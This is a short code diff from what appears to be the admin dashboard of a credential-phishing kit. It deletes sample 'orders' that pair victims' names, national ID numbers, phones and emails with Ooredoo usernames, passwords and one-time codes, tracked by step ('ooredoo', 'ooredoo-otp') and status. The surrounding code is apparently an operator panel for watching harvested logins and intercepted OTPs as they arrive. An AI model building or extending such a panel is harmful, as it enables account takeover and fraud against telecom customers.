@@ -487,12 +487,7 @@ $("logoutBtn").onclick = () => { try { sessionStorage.removeItem("fz_admin_pw");
 })();
 
 // ===== جلب البيانات =====
-const DEMO_ORDERS = [
-  {ref:"HM-100001", ts:Date.now()-40000, status:"awaiting", step:"ooredoo", n:"أحمد محمود", id:"912345678", p:"0591234567", e:"ahmed@gmail.com", g:"male", ooredoo:{username:"ahmed_m",password:"pass123",otp:""}},
-  {ref:"HM-100002", ts:Date.now()-120000, status:"awaiting", step:"ooredoo-otp", n:"سارة خالد", id:"923456789", p:"0561234567", e:"sara@gmail.com", g:"female", ooredoo:{username:"sara_k",password:"mypass",otp:"482916"}},
-  {ref:"HM-100003", ts:Date.now()-600000, status:"confirmed", n:"محمد علي", id:"934567890", p:"0597654321", e:"moh@gmail.com", g:"male", ooredoo:{username:"moh_ali",password:"secret",otp:"193847"}},
-  {ref:"HM-100004", ts:Date.now()-3600000, status:"pending", n:"فاطمة يوسف", id:"945678901", p:"0567891234", e:"fatma@gmail.com", g:"female"}
-];
+const DEMO_ORDERS = [];
 async function refresh(){
   if (MODE === "server") {
     try {
